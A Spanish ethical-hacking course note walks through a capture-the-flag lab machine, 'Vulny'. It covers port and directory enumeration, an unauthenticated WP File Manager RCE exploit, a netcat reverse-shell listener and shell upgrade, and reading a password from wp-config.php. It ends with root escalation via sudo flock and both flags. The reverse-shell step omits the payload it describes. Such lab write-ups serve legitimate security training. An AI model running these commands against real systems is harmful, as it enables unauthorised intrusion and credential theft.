---
title: "🖥️ Máquina: Vulny — Hacking Ético"
aliases:
  - Vulny
  - vulny
  - Máquina Vulny
  - VM Vulny
  - Writeup Vulny
tags:
  - ifct0109
  - hacking-etico
  - vms
  - vulnerabilidades-web
  - linux
  - ctf
---

# 🖥️ Máquina: Vulny

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Vulnerabilidades Web  
> **Técnicas trabajadas:** Fuzzing web · Explotación de plugin WordPress (RCE) · Reverse Shell · Lectura de archivos de configuración · Escalada de privilegios (sudo / flock)  
> **Descripción:** En esta práctica explotaremos una vulnerabilidad conocida en el plugin WP File Manager de WordPress que permite subir archivos sin autenticación y ejecutar código remoto. Una vez dentro del sistema, leeremos credenciales ocultas en un archivo de configuración y escalaremos privilegios abusando del comando flock con permisos de sudo.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.44`
* **`RHOST` (Víctima / Vulny):** Ej. `10.0.0.48`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Vulny tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Comenzamos con un escaneo completo de puertos TCP:

```bash
nmap -sT -p- 10.0.0.48
```

```text
PORT      STATE SERVICE
80/tcp    open  http
33060/tcp open  mysqlx
```

Lanzamos un escaneo detallado sobre el puerto 80:

```bash
nmap -A -p80 10.0.0.48
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

> [!info] Resultado
> El servidor web corre Apache 2.4.41 sobre Ubuntu. La página principal muestra la página por defecto de Apache, sin contenido relevante. Necesitamos buscar directorios ocultos.

---

## 🌐 Fase 2: Enumeración web

Usamos gobuster para buscar directorios y archivos ocultos en la raíz del servidor:

```bash
gobuster dir -u http://10.0.0.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
```

```text
/secret    (Status: 301) [Size: 305] [--> http://10.0.0.48/secret/]
```

> [!info] Resultado
> Encontramos un directorio llamado /secret. Profundizamos en él con otro escaneo:

```bash
gobuster dir -u http://10.0.0.48/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

```text
/wp-content    (Status: 301) [--> http://10.0.0.48/secret/wp-content/]
/wp-includes   (Status: 301) [--> http://10.0.0.48/secret/wp-includes/]
/readme.html   (Status: 200) [Size: 7368]
/wp-admin      (Status: 301) [--> http://10.0.0.48/secret/wp-admin/]
```

> [!info] Resultado
> La estructura de directorios corresponde a una instalación de WordPress bajo la ruta /secret. Aunque la web no carga correctamente en el navegador, los archivos y directorios son accesibles. Revisamos el contenido de /wp-content y encontramos un directorio de plugins con WP File Manager instalado.

---

## 💥 Fase 3: Explotación del plugin WP File Manager

WP File Manager es un plugin de WordPress que permite gestionar archivos del servidor desde el panel de administración. Buscamos si existe alguna vulnerabilidad conocida para esta versión:

```bash
searchsploit wp-file-manager
```

```text
WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE  | php/webapps/51224.py
```

> [!info] Resultado
> Encontramos un exploit que permite subir archivos arbitrarios sin autenticación y obtener ejecución remota de código (RCE — Remote Code Execution). Esto significa que cualquier usuario sin credenciales puede subir un archivo malicioso al servidor y ejecutarlo. Descargamos el exploit en nuestro directorio de trabajo:

```bash
searchsploit -m 51224
```

Lo ejecutamos sin argumentos para ver las instrucciones de uso:

```bash
python3 51224.py
```

```text
[*] Uso: python3 51224.py "url" "comando"
[!] Ejemplo: python3 51224.py http://wordpress.local/ id
```

> [!info] Resultado
> El exploit acepta la URL del WordPress y un comando a ejecutar en el servidor. Probamos primero con id para confirmar que la ejecución remota funciona:

```bash
python3 51224.py http://10.0.0.48/secret/ id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!info] Resultado
> Confirmamos ejecución remota de código como el usuario www-data, que es el usuario bajo el que corre Apache. Ahora lanzamos una reverse shell para obtener una conexión interactiva.

Primero nos ponemos a la escucha en Kali en una terminal separada:

```bash
nc -lvnp {{LPORT}}
```

Y ejecutamos el exploit con el payload de reverse shell. Este payload crea una tubería con mkfifo que redirige la entrada y salida de una shell sh a través de netcat hacia nuestra máquina:

```bash
python3 51224.py http://10.0.0.48/secret/
```

```text
listening on [any] 9002 ...
connect to [10.0.0.44] from (UNKNOWN) [10.0.0.48] 59534
sh: 0: can't access tty; job control turned off
$
```

> [!info] Resultado
> Conexión recibida. Tenemos una shell en el servidor como www-data. La advertencia can't access tty indica que la shell es básica y no del todo interactiva. La mejoramos con Python:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

```text
www-data@vulny:/$
```

---

## 👤 Fase 4: Reconocimiento interno y movimiento lateral

Identificamos qué usuarios del sistema tienen shell válida, filtrando las cuentas de servicio que usan false, nologin o sync:

```bash
cat /etc/passwd | egrep -v "false|nologin|sync"
```

```text
root:x:0:0:root:/root:/bin/bash
adrian:x:1000:1000:adrian:/home/adrian:/bin/bash
```

> [!info] Resultado
> Hay dos usuarios con shell válida: root y adrian. Nuestro objetivo es pivotar a adrian y después escalar a root.

Cuando hay una instalación de WordPress en el servidor, uno de los primeros archivos que debemos buscar es wp-config.php. Este archivo contiene la configuración de la base de datos y a veces credenciales u otra información sensible dejada por los administradores:

```bash
find / -name wp-config.php -type f 2>/dev/null
```

```text
/usr/share/wordpress/wp-config.php
```

```bash
cat /usr/share/wordpress/wp-config.php
```

> [!info] Resultado
> Al leer el archivo encontramos algo que no debería estar ahí: un comentario /* idrinksomewater */ completamente fuera de lugar entre la configuración técnica del archivo. Un wp-config.php normal solo contiene parámetros de conexión a la base de datos, prefijos de tablas y claves de seguridad. Un comentario con una frase así no tiene ningún sentido técnico y es la clase de anotación que alguien podría dejar para recordar una contraseña. Lo probamos directamente con el usuario adrian:

```bash
su adrian
```

```text
Password: idrinksomewater
adrian@vulny:/$
```

> [!info] Resultado
> Acceso exitoso como adrian. El comentario era efectivamente una contraseña anotada de forma descuidada en un archivo de configuración.

```bash
cd ~
```

```bash
cat user.txt
```

```text
HMViuploadfiles
```

> [!info] Resultado
> Flag de usuario obtenida: HMViuploadfiles

---

## 🚀 Fase 5: Escalada de privilegios — sudo / flock

Comprobamos qué comandos puede ejecutar adrian como root:

```bash
sudo -l
```

```text
Matching Defaults entries for adrian on vulny:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User adrian may run the following commands on vulny:
    (ALL : ALL) NOPASSWD: /usr/bin/flock
```

> [!info] Resultado
> Adrian puede ejecutar /usr/bin/flock como root sin contraseña. flock es una herramienta que gestiona bloqueos de archivos para sincronizar el acceso entre procesos. Sin embargo, también permite ejecutar un comando arbitrario mientras mantiene el bloqueo activo, lo que lo convierte en un vector de escalada si se puede ejecutar con sudo.
> Consultamos GTFOBins → flock → sudo para ver el exploit recomendado.

El parámetro -u indica que el bloqueo no es exclusivo y / es el archivo sobre el que se aplica el bloqueo (en este caso la raíz, que siempre existe). El último argumento es el comando a ejecutar, en este caso /bin/bash, que se lanza con los privilegios de root gracias a sudo:

```bash
sudo flock -u / /bin/bash
```

```text
root@vulny:/home/adrian#
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cd /root
cat root.txt
```

```text
HMVididit
```

> [!info] Resultado
> Flag de root obtenida: HMVididit

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
